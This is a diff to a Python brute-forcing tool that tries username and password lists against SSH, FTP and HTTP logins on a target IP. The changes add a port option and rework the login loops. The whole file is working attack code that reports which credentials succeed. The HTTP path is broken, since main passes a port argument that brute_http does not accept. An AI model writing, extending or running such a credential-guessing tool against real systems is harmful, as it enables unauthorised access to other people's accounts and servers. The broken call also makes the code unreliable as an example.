@@ -2,12 +2,13 @@ import argparse
 import paramiko
 import ftplib
 import requests
-import sys
+import sys, os
 import time
 
 def parse_arguments():
     parser = argparse.ArgumentParser(description="Brute-force SSH, FTP, and HTTP")
     parser.add_argument("-c", "--command", required=True, choices=["ssh", "ftp", "http"], help="Command type (ssh/ftp/http)")
+    parser.add_argument("-port", "--port", required=False, help="Specify the port (it can be empty)")
     parser.add_argument("-ip", "--ip", required=True, help="Target IP address")
     parser.add_argument("-u", "--username", required=True, help="Username (can be a file or a single string)")
     parser.add_argument("-p", "--passwords", required=True, help="Password file or list of passwords")
@@ -15,7 +16,8 @@ def parse_arguments():
 
 
 def read_username(string_or_file_path):
-    if string_or_file_path != type(str):    
+    if os.path.isfile(string_or_file_path):
+        print("[+] File Username Found")
         try:
             with open(string_or_file_path, 'r') as f:
                 return [line.strip() for line in f if line.strip()]
@@ -23,7 +25,8 @@ def read_username(string_or_file_path):
             print(f"Error: Password file '{string_or_file_path}' not found.")
             sys.exit(1)
     else:
-        return string_or_file_path
+        print("[+] File Username Not Found, username is: ", str(string_or_file_path))
+        return [string_or_file_path]
 
 def read_passwords(file_path):
     try:
@@ -33,74 +36,46 @@ def read_passwords(file_path):
         print(f"Error: Password file '{file_path}' not found.")
         sys.exit(1)
 
-def brute_ssh(ip, username, passwords):
+def brute_ssh(ip, port, username, passwords):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-    if username == type(str):
+    for usr in username:
+        passwordFound = False
         for pwd in passwords:
             try:
-                ssh.connect(ip, username=username, password=pwd, timeout=5)
-                print(f"[SSH] Success: {username}:{pwd}")
+                ssh.connect(ip, port=port, username=usr, password=pwd, timeout=5)
+                print(f"[SSH] Success: {usr}:{pwd}")
                 ssh.close()
-                return
+                passwordFound = True
+                break
             except paramiko.AuthenticationException:
-                print(f"[SSH] Failed: {username}:{pwd}")
+                print(f"[SSH] Failed: {usr}:{pwd}")
             except Exception as e:
                 print(f"[SSH] Error: {e}")
-                time.sleep(1)
-        print(f"[SSH] No password found for {username} on {ip}")
-    else:
-        for usr in username:
-            passwordFound = False
-            for pwd in passwords:
-                try:
-                    ssh.connect(ip, username=usr, password=pwd, timeout=5)
-                    print(f"[SSH] Success: {usr}:{pwd}")
-                    ssh.close()
-                    passwordFound = True
-                    break
-                except paramiko.AuthenticationException:
-                    print(f"[SSH] Failed: {usr}:{pwd}")
-                except Exception as e:
-                    print(f"[SSH] Error: {e}")
-                    time.sleep(1)                    
-            if passwordFound == False:
-                print(f"[SSH] No password found for {usr} on {ip}")
+                time.sleep(1)                    
+        if passwordFound == False:
+            print(f"[SSH] No password found for {usr} on {ip}")
 
-def brute_ftp(ip, username, passwords):
-    if username == type(str):
+def brute_ftp(ip, port, username, passwords):
+    for usr in username:
+        passwordFound = False
         for pwd in passwords:
             try:
-                ftp = ftplib.FTP(ip)
-                ftp.login(username, pwd)
-                print(f"[FTP] Success: {username}:{pwd}")
+                ftp = ftplib.FTP()
+                ftp.connect(ip, port, timeout=5)  # connessione con porta personalizzata
+                ftp.login(usr, pwd)
+                print(f"[FTP] Success: {usr}:{pwd}")
                 ftp.quit()
-                return
+                passwordFound = True
+                break
             except ftplib.error_perm:
-                print(f"[FTP] Failed: {username}:{pwd}")
+                print(f"[FTP] Failed: {usr}:{pwd}")
             except Exception as e:
                 print(f"[FTP] Error: {e}")
                 time.sleep(1)
-        print(f"[FTP] No password found for {username} on {ip}")
-    else:
-        for usr in username:
-            passwordFound = False
-            for pwd in passwords:
-                try:
-                    ftp = ftplib.FTP(ip)
-                    ftp.login(usr, pwd)
-                    print(f"[FTP] Success: {usr}:{pwd}")
-                    ftp.quit()
-                    passwordFound = True
-                    break
-                except ftplib.error_perm:
-                    print(f"[FTP] Failed: {usr}:{pwd}")
-                except Exception as e:
-                    print(f"[FTP] Error: {e}")
-                    time.sleep(1)
-            if passwordFound == False:
-                print(f"[FTP] No password found for {usr} on {ip}")
+        if passwordFound == False:
+            print(f"[FTP] No password found for {usr} on {ip}")
 
 def brute_http(ip, username, passwords):
     for pwd in passwords:
@@ -123,11 +98,14 @@ def main():
     username = read_username(args.username)
     
     if args.command == "ssh":
-        brute_ssh(args.ip, username, passwords)
+        if args.port == None: args.port = 22
+        brute_ssh(args.ip, int(args.port), username, passwords)
     elif args.command == "ftp":
-        brute_ftp(args.ip, username, passwords)
+        if args.port == None: args.port = 21
+        brute_ftp(args.ip, int(args.port), username, passwords)
     elif args.command == "http":
-        brute_http(args.ip, username, passwords)
+        if args.port == None: args.port = 80
+        brute_http(args.ip, int(args.port), username, passwords)
 
 if __name__ == "__main__":
     main()
